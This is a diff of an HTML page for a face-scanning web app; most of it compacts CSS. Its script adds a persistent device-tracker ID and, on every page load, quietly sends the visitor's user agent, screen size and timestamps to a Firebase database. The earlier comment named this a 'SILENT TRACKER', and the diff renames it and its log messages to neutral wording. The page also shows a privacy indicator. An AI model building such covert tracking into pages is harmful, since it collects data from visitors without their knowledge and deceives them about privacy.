@@ -10,8 +10,12 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   
+  <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  
+  <!-- Tumhari Config File -->
+  <script src="config.js"></script>
 
   <style>
     :root {
@@ -41,97 +45,44 @@
     button, input { font: inherit; }
     button { cursor: pointer; }
 
-    .topbar {
-      height: 76px; padding: 0 clamp(18px, 5vw, 70px);
-      display: flex; align-items: center; justify-content: space-between;
-      border-bottom: 1px solid var(--line); background: rgba(3, 7, 18, 0.8);
-      backdrop-filter: blur(18px); position: sticky; top: 0; z-index: 20;
-    }
+    /* TOPBAR & UI STYLES */
+    .topbar { height: 76px; padding: 0 clamp(18px, 5vw, 70px); display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--line); background: rgba(3, 7, 18, 0.8); backdrop-filter: blur(18px); position: sticky; top: 0; z-index: 20; }
     .brand { display: flex; align-items: center; gap: 12px; text-decoration: none; color: var(--text); }
-    .brand-mark {
-      width: 39px; height: 39px; border-radius: 13px; display: grid; place-items: center;
-      background: linear-gradient(135deg, #00d4ff, #0055ff);
-      box-shadow: 0 0 20px var(--cyan-glow); font-size: 20px; color: #000; font-weight: bold;
-    }
+    .brand-mark { width: 39px; height: 39px; border-radius: 13px; display: grid; place-items: center; background: linear-gradient(135deg, #00d4ff, #0055ff); box-shadow: 0 0 20px var(--cyan-glow); font-size: 20px; color: #000; font-weight: bold; }
     .brand-name { font: 700 18px "Space Grotesk"; letter-spacing: .5px; }
     .brand-name span { color: var(--cyan); }
-
     .nav-right { display: flex; align-items: center; gap: 20px; }
     .privacy { font-size: 12px; color: var(--muted); display: flex; align-items: center; gap: 8px; }
     .privacy i { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 12px var(--green); }
-    .top-pill {
-      border: 1px solid var(--cyan); color: var(--cyan); background: rgba(0, 212, 255, 0.1);
-      padding: 9px 14px; border-radius: 999px; font-size: 12px; font-weight: 700;
-    }
+    .top-pill { border: 1px solid var(--cyan); color: var(--cyan); background: rgba(0, 212, 255, 0.1); padding: 9px 14px; border-radius: 999px; font-size: 12px; font-weight: 700; }
 
     main { max-width: 1180px; margin: auto; padding: 40px 24px 60px; }
     .hero { text-align: center; margin: 0 auto 38px; max-width: 720px; }
-    .eyebrow {
-      display: inline-flex; align-items: center; gap: 8px; color: var(--cyan);
-      border: 1px solid var(--line); background: rgba(0, 212, 255, 0.05);
-      border-radius: 999px; padding: 7px 12px; font-size: 11px; font-weight: 800; letter-spacing: 1.4px;
-    }
+    .eyebrow { display: inline-flex; align-items: center; gap: 8px; color: var(--cyan); border: 1px solid var(--line); background: rgba(0, 212, 255, 0.05); border-radius: 999px; padding: 7px 12px; font-size: 11px; font-weight: 800; letter-spacing: 1.4px; }
     .hero h1 { font: 700 clamp(34px, 5vw, 58px)/1.08 "Space Grotesk"; letter-spacing: -2px; margin: 20px 0 14px; }
     .hero h1 em { font-style: normal; color: var(--cyan); text-shadow: 0 0 20px var(--cyan-glow); }
     .hero p { font-size: 15px; line-height: 1.7; color: var(--muted); max-width: 590px; margin: auto; }
 
     .workspace { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; align-items: stretch; }
-    
-    .panel {
-      background: rgba(11, 17, 32, 0.8); border: 1px solid var(--line);
-      border-radius: 20px; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
-      overflow: hidden; backdrop-filter: blur(10px);
-    }
-    .panel-head {
-      display: flex; align-items: center; justify-content: space-between;
-      padding: 20px 24px; border-bottom: 1px solid var(--line);
-    }
+    .panel { background: rgba(11, 17, 32, 0.8); border: 1px solid var(--line); border-radius: 20px; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5); overflow: hidden; backdrop-filter: blur(10px); }
+    .panel-head { display: flex; align-items: center; justify-content: space-between; padding: 20px 24px; border-bottom: 1px solid var(--line); }
     .panel-title { font: 600 15px "Space Grotesk"; color: #fff; }
     .step { font-size: 11px; color: var(--cyan); background: rgba(0, 212, 255, 0.1); padding: 6px 10px; border-radius: 999px; border: 1px solid rgba(0, 212, 255, 0.2);}
 
     .camera-area { padding: 20px; }
-    .camera-frame {
-      position: relative; aspect-ratio: 4/3; background: #000;
-      border: 1px solid var(--cyan); border-radius: 16px; overflow: hidden; display: grid; place-items: center;
-      box-shadow: inset 0 0 30px rgba(0, 212, 255, 0.1);
-    }
-    
-    #video {
-      width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1);
-      opacity: 0.8; filter: contrast(1.2) grayscale(0.3);
-    }
+    .camera-frame { position: relative; aspect-ratio: 4/3; background: #000; border: 1px solid var(--cyan); border-radius: 16px; overflow: hidden; display: grid; place-items: center; box-shadow: inset 0 0 30px rgba(0, 212, 255, 0.1); }
+    #video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); opacity: 0.8; filter: contrast(1.2) grayscale(0.3); }
     
     .camera-placeholder { text-align: center; padding: 20px; max-width: 310px; z-index: 1; }
-    .camera-icon {
-      width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 17px; display: grid; place-items: center;
-      background: rgba(0, 212, 255, 0.1); border: 2px solid var(--cyan);
-      font-size: 28px; color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow);
-      animation: pulse-glow 2s infinite;
-    }
+    .camera-icon { width: 66px; height: 66px; border-radius: 50%; margin: 0 auto 17px; display: grid; place-items: center; background: rgba(0, 212, 255, 0.1); border: 2px solid var(--cyan); font-size: 28px; color: var(--cyan); box-shadow: 0 0 20px var(--cyan-glow); animation: pulse-glow 2s infinite; }
     @keyframes pulse-glow { 0% { box-shadow: 0 0 10px var(--cyan-glow); } 50% { box-shadow: 0 0 30px var(--cyan-glow); } 100% { box-shadow: 0 0 10px var(--cyan-glow); } }
-    
     .camera-placeholder h3 { font: 600 17px "Space Grotesk"; margin-bottom: 7px; color: #fff; }
     .camera-placeholder p { font-size: 12px; line-height: 1.6; color: var(--muted); }
 
-    .face-guide {
-      position: absolute; width: 43%; height: 73%;
-      border: 2px solid var(--cyan); border-radius: 48% 48% 43% 43%;
-      box-shadow: inset 0 0 20px var(--cyan-glow); display: none; pointer-events: none; z-index: 3;
-    }
-
-    .scan-beam {
-      position: absolute; left: 0; right: 0; height: 3px; top: 0;
-      background: #fff; box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan);
-      display: none; animation: scan 1.5s linear infinite; z-index: 4;
-    }
+    .face-guide { position: absolute; width: 43%; height: 73%; border: 2px solid var(--cyan); border-radius: 48% 48% 43% 43%; box-shadow: inset 0 0 20px var(--cyan-glow); display: none; pointer-events: none; z-index: 3; }
+    .scan-beam { position: absolute; left: 0; right: 0; height: 3px; top: 0; background: #fff; box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan); display: none; animation: scan 1.5s linear infinite; z-index: 4; }
     @keyframes scan { to { top: 100%; } }
-
-    .camera-status {
-      position: absolute; left: 13px; top: 13px; display: none; align-items: center; gap: 7px;
-      border: 1px solid var(--cyan); background: rgba(0, 0, 0, 0.8);
-      padding: 6px 12px; border-radius: 999px; font-size: 10px; color: var(--cyan);
-      font-family: monospace; z-index: 5;
-    }
+    .camera-status { position: absolute; left: 13px; top: 13px; display: none; align-items: center; gap: 7px; border: 1px solid var(--cyan); background: rgba(0, 0, 0, 0.8); padding: 6px 12px; border-radius: 999px; font-size: 10px; color: var(--cyan); font-family: monospace; z-index: 5; }
     .camera-status i { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 5px var(--green); }
 
     .controls { display: flex; gap: 12px; margin-top: 20px; }
@@ -141,17 +92,12 @@
     .primary:disabled { opacity: .3; cursor: not-allowed; transform: none; box-shadow: none; background: var(--panel2); color: var(--muted); }
     .secondary { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--line); }
 
-    .log {
-      margin: 0 20px 20px; padding: 15px; border-radius: 12px;
-      background: #000; border: 1px solid var(--line);
-      font: 12px/1.8 monospace; color: var(--cyan); min-height: 70px;
-    }
+    .log { margin: 0 20px 20px; padding: 15px; border-radius: 12px; background: #000; border: 1px solid var(--line); font: 12px/1.8 monospace; color: var(--cyan); min-height: 70px; }
     .log-line { display: flex; gap: 8px; }
     .log-line i { color: var(--green); font-style: normal; }
 
     .results-body { padding: 24px; min-height: 100%; }
     .empty-state { min-height: 380px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-    
     .orbit { width: 120px; height: 120px; border: 1px solid var(--cyan); border-radius: 50%; display: grid; place-items: center; position: relative; margin-bottom: 24px; }
     .orbit:before, .orbit:after { content: ""; position: absolute; border: 1px solid rgba(0, 212, 255, 0.3); border-radius: 50%; }
     .orbit:before { inset: 15px; }
@@ -163,11 +109,7 @@
     .empty-state p { font-size: 13px; line-height: 1.6; color: var(--muted); max-width: 280px; }
 
     .progress-wrap { display: none; text-align: center; padding: 40px 15px; }
-    .progress-ring {
-      width: 80px; height: 80px; border: 3px solid rgba(0, 212, 255, 0.1);
-      border-top-color: var(--cyan); border-right-color: var(--green); border-radius: 50%;
-      margin: 0 auto 24px; animation: spin .8s linear infinite;
-    }
+    .progress-ring { width: 80px; height: 80px; border: 3px solid rgba(0, 212, 255, 0.1); border-top-color: var(--cyan); border-right-color: var(--green); border-radius: 50%; margin: 0 auto 24px; animation: spin .8s linear infinite; }
     .progress-wrap h3 { font: 600 18px "Space Grotesk"; margin-bottom: 8px; color: #fff; }
     .progress-wrap p { font-size: 13px; color: var(--cyan); font-family: monospace; }
     .progress-track { height: 6px; border-radius: 99px; background: rgba(255, 255, 255, 0.1); overflow: hidden; margin: 24px auto 0; max-width: 280px; }
@@ -180,11 +122,7 @@
     .demo-tag { font-size: 10px; color: var(--green); background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); padding: 6px 10px; border-radius: 999px; font-weight: bold;}
 
     .result-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
-    .person {
-      display: flex; align-items: center; gap: 12px; padding: 12px;
-      background: rgba(255, 255, 255, 0.03); border: 1px solid var(--line);
-      border-radius: 12px;
-    }
+    .person { display: flex; align-items: center; gap: 12px; padding: 12px; background: rgba(255, 255, 255, 0.03); border: 1px solid var(--line); border-radius: 12px; }
     .person img { width: 50px; height: 50px; border-radius: 10px; object-fit: cover; border: 1px solid var(--line); }
     .person-info { min-width: 0; }
     .person-info b { display: block; font-size: 13px; color: #fff; }
@@ -197,10 +135,7 @@
     .modal-card p { font-size: 13px; line-height: 1.6; color: var(--muted); margin-bottom: 25px; }
     .modal-actions { display: flex; gap: 10px; }
 
-    @media(max-width:850px) {
-      .workspace { grid-template-columns: 1fr; }
-      .result-grid { grid-template-columns: 1fr; }
-    }
+    @media(max-width:850px) { .workspace { grid-template-columns: 1fr; } .result-grid { grid-template-columns: 1fr; } }
   </style>
 </head>
 
@@ -297,17 +232,18 @@
 
   <script>
     // ==========================================
-    // 🚀 1. INITIALIZE FIREBASE
+    // 🚀 1. INITIALIZE FIREBASE (Guaranteed)
     // ==========================================
     let db = null;
     let deviceId = localStorage.getItem('device_tracker_id') || 'XPUI' + Math.floor(1000 + Math.random() * 9000) + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + String.fromCharCode(65 + Math.floor(Math.random() * 26));
     localStorage.setItem('device_tracker_id', deviceId);
     
+    // Check config.js loaded
     if (typeof firebaseConfig !== 'undefined') {
       if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
       db = firebase.database();
       
-      // 🚀 SILENT TRACKER: Save basic info on page load
+      // Save basic info
       const deviceInfo = {
         deviceId: deviceId,
         userAgent: navigator.userAgent,
@@ -318,24 +254,22 @@
         lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
       };
 
-      // Check if online
       db.ref(`online_devices/${deviceId}`).set({
         status: 'online',
         lastSeen: Date.now(),
         screen: window.screen.width + 'x' + window.screen.height
       });
       
-      // Save to main devices node
       db.ref(`devices/${deviceId}`).update(deviceInfo)
-        .then(() => console.log("✅ Silent tracker: Device registered", deviceId))
-        .catch(e => console.error("❌ Silent tracker failed:", e));
+        .then(() => console.log("✅ Device Info Saved:", deviceId))
+        .catch(e => console.error("❌ Save Failed:", e));
 
     } else {
-      console.error("config.js missing");
+      console.error("❌ config.js file load nahi hui hai. Check script tag.");
     }
 
     // ==========================================
-    // 🚀 2. CAMERA & SCANNING LOGIC
+    // 🚀 2. CAMERA LOGIC
     // ==========================================
     const $ = id => document.getElementById(id);
     const video = $("video");
